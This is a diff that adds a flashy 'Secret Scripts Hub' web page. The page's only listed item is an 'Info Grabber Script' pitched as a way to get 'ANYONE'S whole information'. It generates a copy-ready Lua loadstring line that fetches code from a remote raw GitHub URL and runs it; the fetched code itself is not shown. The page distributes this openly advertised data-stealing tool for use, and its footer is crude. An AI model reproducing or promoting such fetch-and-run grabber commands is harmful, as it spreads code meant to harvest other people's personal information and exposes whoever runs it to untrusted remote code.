@@ -1,0 +1,1037 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XEN-X Secret Scripts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e27;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background: linear-gradient(135deg, #667eea, #764ba2, #f093fb, #4facfe);
+            background-size: 400% 400%;
+            animation: gradientShift 20s ease-in-out infinite;
+            opacity: 0.15;
+            z-index: 0;
+        }
+
+        @keyframes gradientShift {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .background-layer {
+            display: none;
+        }
+
+        .container {
+            background: rgba(15, 20, 45, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            box-shadow: 
+                0 8px 32px 0 rgba(138, 43, 226, 0.37),
+                0 0 80px rgba(120, 119, 198, 0.2),
+                inset 0 0 60px rgba(255, 255, 255, 0.05);
+            border: 2px solid;
+            border-image: linear-gradient(135deg, rgba(102, 126, 234, 0.5), rgba(138, 43, 226, 0.5), rgba(240, 147, 251, 0.5)) 1;
+            padding: 50px;
+            max-width: 750px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(
+                from 0deg at 50% 50%,
+                transparent 0deg,
+                rgba(102, 126, 234, 0.1) 90deg,
+                transparent 180deg,
+                rgba(138, 43, 226, 0.1) 270deg,
+                transparent 360deg
+            );
+            animation: rotate 20s linear infinite;
+        }
+
+        .container::after {
+            content: '';
+            position: absolute;
+            inset: 2px;
+            background: rgba(15, 20, 45, 0.9);
+            border-radius: 23px;
+            z-index: -1;
+        }
+
+        @keyframes rotate {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        h1 {
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 35px;
+            font-size: 42px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            filter: drop-shadow(0 0 30px rgba(120, 119, 198, 0.6));
+            animation: titleGlow 3s ease-in-out infinite;
+            position: relative;
+        }
+
+        h1::before {
+            content: '🚀 SECRET SCRIPT HUB';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: blur(10px);
+            opacity: 0.5;
+            z-index: -1;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { 
+                filter: drop-shadow(0 0 20px rgba(120, 119, 198, 0.6)) drop-shadow(0 0 40px rgba(138, 43, 226, 0.4));
+            }
+            50% { 
+                filter: drop-shadow(0 0 40px rgba(138, 43, 226, 0.8)) drop-shadow(0 0 60px rgba(240, 147, 251, 0.6));
+            }
+        }
+
+        .dropdown {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .dropdown-button {
+            width: 100%;
+            padding: 18px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+            box-shadow: 
+                0 4px 15px rgba(102, 126, 234, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .dropdown-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.7s;
+        }
+
+        .dropdown-button:hover::before {
+            left: 100%;
+        }
+
+        .dropdown-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 8px 25px rgba(102, 126, 234, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+        }
+
+        .dropdown-button::after {
+            content: '▼';
+            font-size: 12px;
+            transition: transform 0.3s;
+        }
+
+        .dropdown-button.active::after {
+            transform: rotate(180deg);
+        }
+
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: rgba(20, 25, 50, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(102, 126, 234, 0.3);
+            border-radius: 12px;
+            margin-top: 8px;
+            max-height: 320px;
+            overflow-y: auto;
+            z-index: 10;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+        }
+
+        .dropdown-menu::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .dropdown-menu::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .dropdown-menu::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #667eea, #764ba2);
+            border-radius: 10px;
+        }
+
+        .dropdown-menu.active {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .dropdown-item {
+            padding: 14px 18px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 14px;
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .dropdown-item::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 3px;
+            background: linear-gradient(180deg, #667eea, #764ba2);
+            transform: scaleY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .dropdown-item:hover::before {
+            transform: scaleY(1);
+        }
+
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+
+        .dropdown-item:hover {
+            background: rgba(102, 126, 234, 0.2);
+            padding-left: 25px;
+        }
+
+        .info-section {
+            background: linear-gradient(135deg, rgba(20, 25, 50, 0.9) 0%, rgba(30, 35, 70, 0.7) 100%);
+            backdrop-filter: blur(15px);
+            border: 2px solid rgba(102, 126, 234, 0.4);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .info-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(102, 126, 234, 0.2), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .info-section::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(102, 126, 234, 0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        .info-section.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .info-emoji {
+            font-size: 32px;
+            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .info-title {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 0%, #667eea 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            flex: 1;
+        }
+
+        .info-game {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .info-description {
+            font-size: 14px;
+            color: #b8c5d6;
+            margin-bottom: 18px;
+            line-height: 1.7;
+            position: relative;
+            z-index: 1;
+        }
+
+        .script-display {
+            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+            border: 3px solid;
+            border-image: linear-gradient(135deg, #667eea, #00ff88) 1;
+            border-radius: 15px;
+            padding: 20px;
+            min-height: 90px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            word-break: break-all;
+            color: #00ff88;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.5s ease 0.2s, transform 0.5s ease 0.2s;
+            overflow-x: auto;
+            box-shadow: 
+                inset 0 0 30px rgba(0, 255, 136, 0.15),
+                0 0 30px rgba(102, 126, 234, 0.4),
+                0 4px 20px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+            animation: codePulse 2s ease-in-out infinite;
+        }
+
+        @keyframes codePulse {
+            0%, 100% {
+                box-shadow: 
+                    inset 0 0 30px rgba(0, 255, 136, 0.15),
+                    0 0 30px rgba(102, 126, 234, 0.4),
+                    0 4px 20px rgba(0, 0, 0, 0.5);
+            }
+            50% {
+                box-shadow: 
+                    inset 0 0 40px rgba(0, 255, 136, 0.25),
+                    0 0 50px rgba(102, 126, 234, 0.6),
+                    0 4px 20px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        .script-display::before {
+            content: '> ';
+            color: #667eea;
+            font-weight: bold;
+        }
+
+        .script-display.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .copy-button {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #00d4ff 0%, #667eea 50%, #00ff88 100%);
+            background-size: 200% 200%;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 700;
+            margin-top: 20px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            box-shadow: 
+                0 6px 25px rgba(0, 212, 255, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            animation: buttonGradient 3s ease infinite;
+        }
+
+        @keyframes buttonGradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .copy-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.4);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .copy-button:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+
+        .copy-button:hover {
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 
+                0 12px 40px rgba(0, 212, 255, 0.7),
+                inset 0 1px 0 rgba(255, 255, 255, 0.4);
+        }
+
+        .copy-button:active {
+            transform: scale(0.97);
+        }
+
+        .copy-button.copied {
+            background: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
+            box-shadow: 0 6px 25px rgba(0, 255, 136, 0.6);
+        }
+
+        .placeholder {
+            text-align: center;
+            color: #667eea;
+            padding: 70px 20px;
+            font-size: 18px;
+        }
+
+        .placeholder-emoji {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: bounce 2s ease-in-out infinite;
+            filter: drop-shadow(0 0 20px rgba(102, 126, 234, 0.6));
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .copyright {
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            border-top: 1px solid rgba(102, 126, 234, 0.3);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+            line-height: 1.8;
+        }
+
+        .copyright-title {
+            font-weight: 700;
+            color: #667eea;
+            font-size: 14px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .copyright-icon {
+            font-size: 16px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(102, 126, 234, 0.5);
+            border-radius: 50%;
+            animation: floatParticle 20s infinite;
+        }
+
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px);
+                opacity: 0;
+            }
+        }
+
+        /* Custom Cursor Styles - PC Only */
+        @media (hover: hover) and (pointer: fine) {
+            body, body * {
+                cursor: none !important;
+            }
+
+            .custom-cursor {
+                position: fixed;
+                width: 32px;
+                height: 32px;
+                pointer-events: none;
+                z-index: 10000;
+                transform: translate(-50%, -50%);
+            }
+
+            .cursor-cat {
+                font-size: 32px;
+                filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.8));
+                animation: catIdle 2s ease-in-out infinite;
+                display: block;
+                line-height: 1;
+            }
+
+            @keyframes catIdle {
+                0%, 100% { transform: rotate(-5deg); }
+                50% { transform: rotate(5deg); }
+            }
+
+            .cursor-cat.moving {
+                animation: catWalk 0.3s ease-in-out infinite;
+            }
+
+            @keyframes catWalk {
+                0%, 100% { transform: rotate(0deg) scale(1); }
+                25% { transform: rotate(-10deg) scale(1.1); }
+                75% { transform: rotate(10deg) scale(1.1); }
+            }
+
+            .cursor-cat.clicking {
+                animation: catClick 0.3s ease;
+                transform: scale(1.3) rotate(20deg);
+            }
+
+            @keyframes catClick {
+                0% { transform: scale(1) rotate(0deg); }
+                50% { transform: scale(1.5) rotate(20deg); }
+                100% { transform: scale(1.3) rotate(20deg); }
+            }
+
+            .cursor-cat.right-clicking {
+                animation: catRightClick 0.5s ease;
+                transform: scale(1.2) rotate(-20deg);
+            }
+
+            @keyframes catRightClick {
+                0% { transform: scale(1) rotate(0deg); }
+                50% { transform: scale(1.4) rotate(-30deg); }
+                100% { transform: scale(1.2) rotate(-20deg); }
+            }
+
+            .cursor-trail {
+                position: fixed;
+                width: 8px;
+                height: 8px;
+                background: radial-gradient(circle, rgba(138, 43, 226, 0.8) 0%, transparent 70%);
+                border-radius: 50%;
+                pointer-events: none;
+                z-index: 9999;
+                animation: trailFade 0.6s ease-out forwards;
+            }
+
+            @keyframes trailFade {
+                0% {
+                    transform: scale(1);
+                    opacity: 1;
+                }
+                100% {
+                    transform: scale(0);
+                    opacity: 0;
+                }
+            }
+
+            .cursor-ring {
+                position: fixed;
+                width: 60px;
+                height: 60px;
+                border: 2px solid rgba(138, 43, 226, 0.5);
+                border-radius: 50%;
+                pointer-events: none;
+                z-index: 9998;
+                transition: all 0.2s ease;
+                animation: ringPulse 2s ease-in-out infinite;
+            }
+
+            @keyframes ringPulse {
+                0%, 100% {
+                    transform: translate(-50%, -50%) scale(1);
+                    opacity: 0.5;
+                }
+                50% {
+                    transform: translate(-50%, -50%) scale(1.2);
+                    opacity: 0.8;
+                }
+            }
+
+            .cursor-ring.clicking {
+                animation: ringClick 0.3s ease;
+            }
+
+            @keyframes ringClick {
+                0% {
+                    transform: translate(-50%, -50%) scale(1);
+                    border-color: rgba(0, 212, 255, 0.8);
+                }
+                50% {
+                    transform: translate(-50%, -50%) scale(1.5);
+                    border-color: rgba(0, 255, 136, 0.8);
+                }
+                100% {
+                    transform: translate(-50%, -50%) scale(1);
+                    border-color: rgba(138, 43, 226, 0.5);
+                }
+            }
+
+            .cursor-ring {
+                display: none;
+            }
+
+            .selection-highlight {
+                position: fixed;
+                background: linear-gradient(135deg, rgba(102, 126, 234, 0.3) 0%, rgba(138, 43, 226, 0.3) 100%);
+                border: 2px solid rgba(138, 43, 226, 0.6);
+                pointer-events: none;
+                z-index: 9997;
+                border-radius: 8px;
+                box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+                animation: selectionGlow 0.3s ease-out;
+            }
+
+            @keyframes selectionGlow {
+                0% { opacity: 0; transform: scale(0.8); }
+                100% { opacity: 1; transform: scale(1); }
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Custom Cursor Elements (PC Only) -->
+    <div class="custom-cursor" id="customCursor">
+        <div class="cursor-cat">🐈‍⬛</div>
+    </div>
+    <div class="cursor-ring" id="cursorRing"></div>
+    
+    <div class="background-layer"></div>
+    
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <h1>🚀 SECRET SCRIPTS HUB</h1>
+        
+        <div class="dropdown">
+            <button class="dropdown-button" id="dropdownBtn">
+                Select a Script
+            </button>
+            <div class="dropdown-menu" id="dropdownMenu">
+                <!-- Scripts will be added here -->
+            </div>
+        </div>
+
+        <div id="contentArea">
+            <div class="placeholder">
+                <div class="placeholder-emoji">📜</div>
+                Select a script from the dropdown above
+            </div>
+        </div>
+
+        <div class="copyright">
+            <div class="copyright-title">
+                <span class="copyright-icon">©</span> Copyright Notice
+            </div>
+            <div>
+                who gives a fuck?
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Custom Cursor for PC Only
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        
+        if (!isTouchDevice) {
+            const cursor = document.getElementById('customCursor');
+            const cursorCat = cursor.querySelector('.cursor-cat');
+            let isMoving = false;
+            let movingTimeout;
+            let lastX = 0, lastY = 0;
+            let selectionBox = null;
+            let isSelecting = false;
+            let startX = 0, startY = 0;
+
+            // Direct cursor movement - no lag, follows mouse exactly
+            document.addEventListener('mousemove', (e) => {
+                cursor.style.left = e.clientX + 'px';
+                cursor.style.top = e.clientY + 'px';
+
+                // Create trail
+                if (Math.random() > 0.7) {
+                    createTrail(e.clientX, e.clientY);
+                }
+
+                // Check if moving
+                const distance = Math.sqrt(Math.pow(e.clientX - lastX, 2) + Math.pow(e.clientY - lastY, 2));
+                if (distance > 2) {
+                    if (!isMoving) {
+                        cursorCat.classList.add('moving');
+                        isMoving = true;
+                    }
+                    clearTimeout(movingTimeout);
+                    movingTimeout = setTimeout(() => {
+                        cursorCat.classList.remove('moving');
+                        isMoving = false;
+                    }, 100);
+                }
+                lastX = e.clientX;
+                lastY = e.clientY;
+
+                // Update selection box
+                if (isSelecting && selectionBox) {
+                    const width = Math.abs(e.clientX - startX);
+                    const height = Math.abs(e.clientY - startY);
+                    const left = Math.min(e.clientX, startX);
+                    const top = Math.min(e.clientY, startY);
+                    
+                    selectionBox.style.left = left + 'px';
+                    selectionBox.style.top = top + 'px';
+                    selectionBox.style.width = width + 'px';
+                    selectionBox.style.height = height + 'px';
+                }
+            });
+
+            // Click animation
+            document.addEventListener('mousedown', (e) => {
+                if (e.button === 0) { // Left click
+                    cursorCat.classList.remove('clicking');
+                    void cursorCat.offsetWidth; // Trigger reflow
+                    cursorCat.classList.add('clicking');
+                    
+                    setTimeout(() => {
+                        cursorCat.classList.remove('clicking');
+                    }, 300);
+
+                    // Create burst effect
+                    for (let i = 0; i < 8; i++) {
+                        setTimeout(() => createTrail(e.clientX, e.clientY), i * 30);
+                    }
+
+                    // Start selection tracking
+                    isSelecting = true;
+                    startX = e.clientX;
+                    startY = e.clientY;
+                    selectionBox = document.createElement('div');
+                    selectionBox.className = 'selection-highlight';
+                    selectionBox.style.left = startX + 'px';
+                    selectionBox.style.top = startY + 'px';
+                    selectionBox.style.width = '0px';
+                    selectionBox.style.height = '0px';
+                    document.body.appendChild(selectionBox);
+                }
+            });
+
+            document.addEventListener('mouseup', () => {
+                isSelecting = false;
+                if (selectionBox) {
+                    setTimeout(() => {
+                        if (selectionBox && selectionBox.parentNode) {
+                            selectionBox.remove();
+                        }
+                        selectionBox = null;
+                    }, 200);
+                }
+            });
+
+            // Right click animation
+            document.addEventListener('contextmenu', (e) => {
+                cursorCat.classList.remove('right-clicking');
+                void cursorCat.offsetWidth;
+                cursorCat.classList.add('right-clicking');
+                
+                setTimeout(() => {
+                    cursorCat.classList.remove('right-clicking');
+                }, 500);
+
+                // Create spiral effect
+                for (let i = 0; i < 12; i++) {
+                    const angle = (i / 12) * Math.PI * 2;
+                    const radius = 30;
+                    setTimeout(() => {
+                        createTrail(
+                            e.clientX + Math.cos(angle) * radius,
+                            e.clientY + Math.sin(angle) * radius
+                        );
+                    }, i * 40);
+                }
+            });
+
+            // Create trail particles
+            function createTrail(x, y) {
+                const trail = document.createElement('div');
+                trail.className = 'cursor-trail';
+                trail.style.left = x + 'px';
+                trail.style.top = y + 'px';
+                document.body.appendChild(trail);
+
+                setTimeout(() => {
+                    trail.remove();
+                }, 600);
+            }
+
+            // Hide cursor when leaving window
+            document.addEventListener('mouseleave', () => {
+                cursor.style.opacity = '0';
+            });
+
+            document.addEventListener('mouseenter', () => {
+                cursor.style.opacity = '1';
+            });
+        }
+
+        // Create floating particles
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 15) + 's';
+            particlesContainer.appendChild(particle);
+        }
+
+        const scriptsData = [
+            {
+                emoji: "🔥",
+                name: "Info Grabber Script",
+                game: "Any Game",
+                description: "Put Inside Your Script's And You Can Easily Get ANYONE'S Whole Information. Copy The Whole URL Inside The Loadstring To See Source",
+                url: "https://raw.githubusercontent.com/akddkisjgfheyiasdufl/scsc/refs/heads/main/1.lua"
+            }
+        ];
+
+        const dropdownBtn = document.getElementById('dropdownBtn');
+        const dropdownMenu = document.getElementById('dropdownMenu');
+        const contentArea = document.getElementById('contentArea');
+
+        let currentScript = '';
+
+        // Populate dropdown
+        scriptsData.forEach((script, index) => {
+            const item = document.createElement('div');
+            item.className = 'dropdown-item';
+            item.textContent = `${script.emoji} ${script.name}`;
+            item.setAttribute('data-index', index);
+            dropdownMenu.appendChild(item);
+        });
+
+        const dropdownItems = document.querySelectorAll('.dropdown-item');
+
+        dropdownBtn.addEventListener('click', () => {
+            dropdownMenu.classList.toggle('active');
+            dropdownBtn.classList.toggle('active');
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.dropdown')) {
+                dropdownMenu.classList.remove('active');
+                dropdownBtn.classList.remove('active');
+            }
+        });
+
+        dropdownItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const index = item.getAttribute('data-index');
+                const script = scriptsData[index];
+                
+                dropdownBtn.innerHTML = `${script.emoji} ${script.name}`;
+                
+                currentScript = `loadstring(game:HttpGet("${script.url}"))()`;
+                
+                // Fade out current content
+                const existingElements = contentArea.querySelectorAll('.info-section, .script-display, .copy-button');
+                existingElements.forEach(el => {
+                    el.classList.remove('show');
+                });
+
+                // Wait for fade out, then update content
+                setTimeout(() => {
+                    contentArea.innerHTML = `
+                        <div class="info-section">
+                            <div class="info-header">
+                                <span class="info-emoji">${script.emoji}</span>
+                                <div class="info-title">${script.name}</div>
+                                <span class="info-game">${script.game}</span>
+                            </div>
+                            <div class="info-description">${script.description}</div>
+                            <div class="script-display">${currentScript}</div>
+                        </div>
+                        <button class="copy-button" id="copyBtn">📋 Copy Script</button>
+                    `;
+
+                    // Trigger fade in
+                    setTimeout(() => {
+                        const infoSection = contentArea.querySelector('.info-section');
+                        const scriptDisplay = contentArea.querySelector('.script-display');
+                        
+                        infoSection.classList.add('show');
+                        
+                        setTimeout(() => {
+                            scriptDisplay.classList.add('show');
+                        }, 150);
+
+                        // Add copy button functionality
+                        const copyBtn = document.getElementById('copyBtn');
+                        copyBtn.addEventListener('click', copyToClipboard);
+                    }, 50);
+                }, 350);
+                
+                dropdownMenu.classList.remove('active');
+                dropdownBtn.classList.remove('active');
+            });
+        });
+
+        function copyToClipboard() {
+            const copyBtn = document.getElementById('copyBtn');
+            if (currentScript) {
+                navigator.clipboard.writeText(currentScript).then(() => {
+                    copyBtn.innerHTML = '✓ Copied!';
+                    copyBtn.classList.add('copied');
+                    
+                    setTimeout(() => {
+                        copyBtn.innerHTML = '📋 Copy Script';
+                        copyBtn.classList.remove('copied');
+                    }, 2000);
+                }).catch(err => {
+                    alert('Failed to copy script');
+                });
+            }
+        }
+    </script>
+</body>
+</html>
